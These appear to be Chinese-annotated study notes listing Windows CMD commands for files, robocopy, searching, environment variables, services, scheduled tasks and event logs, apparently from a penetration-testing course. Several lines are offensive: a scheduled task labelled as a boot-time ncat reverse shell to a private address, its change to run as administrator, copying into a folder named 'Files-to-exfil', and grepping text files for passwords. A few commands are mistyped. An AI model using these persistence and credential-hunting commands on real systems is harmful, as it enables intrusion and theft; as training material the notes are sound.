# windows系统列出C盘所有文件，包括隐藏
dir c:\ /a
# /a 显示所有文件属性,R只读（Read-only）
dir /A:R
dir /A:H # 隐藏文件
dir /A:S # 系统文件
# 删除所有只读文件
del /A:R *

# 查看文件结构
tree c:\
Tree c:\ /f # 显示文件名

# 查看命令历史
doskey /history

# 创建一个文件夹并删除它
mkdir c:\testfolder
# 删除文件夹及其内容，/s表示删除子目录和文件，/q表示安静模式不提示确认
rmdir /s /q c:\testfolder

# 复制文件
copy c:\source.txt c:\destination.txt
# /v 复制后比较源文件和目标文件是否一致，主要用于 关键文件复制时保证完整性
copy calc.exe C:\Users\student\Downloads\copied-calc.exe /V
# 移动文件
move c:\source.txt c:\destination.txt
# /e 复制目录及其子目录，包括空目录，/h 复制隐藏和系统文件，/y 覆盖现有文件而不提示
# Xcopy 会重置文件的任何属性。如果您希望保留文件的属性（例如只读或隐藏），可以使用 /K 参数。
xcopy c:\source_folder d:\destination_folder /s /e /h /y

# Robocopy 是 xcopy 的继任者，功能更为强大。我们可以把 Robocopy 看作是将 copy、xcopy 和 move 的最佳部分结合起来，并加入了一些额外功能。Robocopy 适用于复制大量文件和目录树。
# 作为普通用户，如果我们没有 SeBackupPrivilege 和审核权限属性，这可能会带来问题。这可能会阻止我们复制或移动文件和目录。不过有一个变通方法。我们可以使用 /MIR 开关暂时允许自己复制所需的文件。
robocopy c:\source_folder d:\destination_folder /e /copyall /mirror
# 如果我们只是想列出将要复制的文件，而不实际执行复制操作，可以使用 /L 开关，/E 表示包括所有子目录（包括空目录），/B 以备份模式运行
robocopy /E /B /L C:\Users\htb\Desktop\example C:\Users\htb\Documents\Backup\
# 添加 /A-:SH 开关，可以清除附加属性，清除文件的系统属性和隐藏属性。 对 /MIR 开关要小心，因为它会将目标目录镜像到源目录。 目标中存在的任何文件都会被删除。确保将新副本放在一个已清空的文件夹中。也就是这个拷贝会导致，拷贝地址的文件消失如果不为空
robocopy /E /MIR /A-:SH C:\Users\htb\Desktop\notes\ C:\Users\htb\Documents\Backup\Files-to-exfil\

# 查看文本文件内容, /s 显示所有行,对于包含多个空行或数据之间有大量空白的较大文件，我们可以使用 /S 选项将这些空白压缩成每处单行，从而更容易查看。
more /S secrets.txt

# Type 命令可以一次显示多个文本文件的内容。也可以结合文件重定向来使用 type。它是一个简单的工具，但非常方便。type 的一个有趣之处在于它不会锁定文件，所以无需担心会破坏文件内容。
type bio.txt

# 创建一个指定大小的文件 ，file：针对文件的操作，createNew：创建一个新文件
fsutil file createNew for-sure.txt 222

# 重命名文件rename缩写是ren
ren demo.txt superdemo.txt

# 在文件中搜索特定字符串，/i 忽略大小写
find /i "see" < test.txt
# 不管 A 成功还是失败，都会执行 B
echo Hello & echo World
# State Dependent &&，只有 A 成功（返回码 0），才执行 B
echo Hello && echo World
# 删除文件夹及其内容，/f 强制删除只读文件，/s 删除指定目录及其所有子目录中的文件，/q 安静模式不提示确认
del /f /s /q c:\testfolder\*.*
earse c:\testfolder\*.*

#  查看系统信息
Systeminfo
# 查看计算机名称
hostname
# 查看Windows版本信息
ver
# 查看arp缓存表
arp /a
# 主机上的用户列表
net user
# 域用户组列表
net groupnet localgroup
# 共享资源列表
net share

# 在指定目录及其子目录中搜索文件
where /R C:\Users\student\ bio.txt

# 在当前目录下的所有文本文件中搜索包含“password”的行
type *.txt | find "password"
# 不包含“password”的行，/n 显示行号,/i 忽略大小写
find /V "password" file.txt
# 相当于grep
findstr

# 比较两个文件的不同之处，简单，报告是否不同，字节位置，只报告结果，/A 以ASCII格式显示，/C 比较整个文件而不是逐行比较
comp .\file-1.md .\file-2.md
# fc区分大小写，文本按行，也可二进制 /B，显示具体差异，/N 修饰符让其打印行号和 ASCII 比较结果。
fc passwords.txt modded.txt /N
# 排序结果写入，/unique 去重
sort.exe .\file-1.md /O .\sort-1.md

# 在当前 CMD 会话中 创建或修改环境变量，临时生效，关闭窗口失效
set MYVAR=HelloWorld
# 永久修改环境变量，使用用户范围（默认）
setx MYVAR "HelloWorld"
# 删除环境变量，赋值为空字符串
setx DCIP ""
# 通过%包裹变量，打印他
echo %MYVAR%

# Tasklist 是一个命令行工具所有运行的进程，并显示 每个进程下挂载的服务利用 /svc 参数，来提供系统中每个进程下运行的服务列表
tasklist /svc
# 只显示 服务（Services），不显示普通进程
net start
# 列出所有服务的简要信息，很详细，包括状态，sid
wmic service list brief

# 查看定时任务，schtasks 列出所有计划任务的详细信息
SCHTASKS /Query /V /FO list /v

# 支持参数主要事件，/create 创建定时任务，/sc schedule 频率，/tn 任务名，/tr 任务运行的程序，/s 远程计算机，/u 用户名，/p 密码，/mo 修饰符, /rl 运行级别highest还是limited，/z 任务完成后删除
# 创建一个开机启动的反向shell任务
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

# 主要事件,/change 修改任务，/tn 任务名，/tr 任务运行的程序，/enable 启用任务，/disable 禁用任务，/ru 以指定用户运行任务，/rp 指定用户密码
# 将任务修改为以管理员身份运行
schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

# 主要事件,/delete 删除任务，/tn 任务名，/f 强制删除不提示确认，/s 远程计算机，/u 用户名，/p 密码
# 删除定时任务
schtasks /delete  /tn "My Secret Task"

# 主要事件,/run 立即运行任务，/tn 任务名，/s 远程计算机，/u 用户名，/p 密码
schtasks /Run /TN "\Microsoft\Windows\EDP\EDP Inaccessible Credentials Task"

# 日志管理
wevtutil /? # 帮助
# 列出所有日志
wevtutil el
# 导出指定日志到文件，/lf:日志文件路径，/f:文件格式
wevtutil epl Application C:\Logs\Application.evtx /f:evtx
# 查看指定日志的属性状态
wevtutil gl "Windows PowerShell"
# 查看有关日志或日志文件的具体状态信息，例如创建时间、上次访问和写入时间、文件大小、日志记录数等等。
wevtutil gli "Windows PowerShell"
# 查询最近的5条安全日志，/c:5 表示只显示5条，/rd:true 按时间倒序显示，/f:text 以文本格式显示
wevtutil qe Security /c:5 /rd:true /f:text